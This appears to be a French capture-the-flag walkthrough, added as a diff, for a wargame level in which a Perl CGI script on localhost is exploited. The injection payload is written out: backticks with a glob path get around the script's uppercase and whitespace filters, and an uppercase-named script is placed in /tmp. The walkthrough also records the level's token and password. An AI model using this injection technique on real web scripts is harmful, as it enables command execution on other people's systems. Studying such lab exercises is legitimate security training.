@@ -1,0 +1,28 @@
+LEVEL 12
+--------
+
+1.  Commande:   ls
+    Sortie:     level12.pl
+
+2.  Commande:   cat level12.pl
+    Sortie:     $xx =~ tr/a-z/A-Z/; # Convertit les minuscules en majuscules.
+                $xx =~ s/\s.*//;    # Retire les espaces etc...
+    Si on passe ces 2 lignes on peut lancer notre script juste après.
+
+3.  On va créer un fichier qui va stocker un script.
+    Commande:   touch /tmp/EXPLOIT && chmod 777 /tmp/EXPLOIT
+    On le met en majuscule pour qu'il puisse passer la ligne $xx =~ tr/a-z/A-Z/;
+
+4.  On introduit le script qui va lui créer un fichier flag avec getflag dedans.
+    Commande:   echo "getflag > /tmp/flag" > /tmp/EXPLOIT
+
+5.  Il ne nous reste plus qu'à lancer la commande curl pour
+    faire une requête au serveur localhost:4646.
+    Commande:   curl localhost:4646?x='`/*/EXPLOIT`'
+    On met une étoile parce que si l'on met tmp, il sera transformé en TMP.
+
+6.  Commande:   cat /tmp/flag
+    Sortie:     Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+
+7.  Commande:   su level13
+    Mdp:        g1qKMiRpXf53AWhDaU7FEkczr
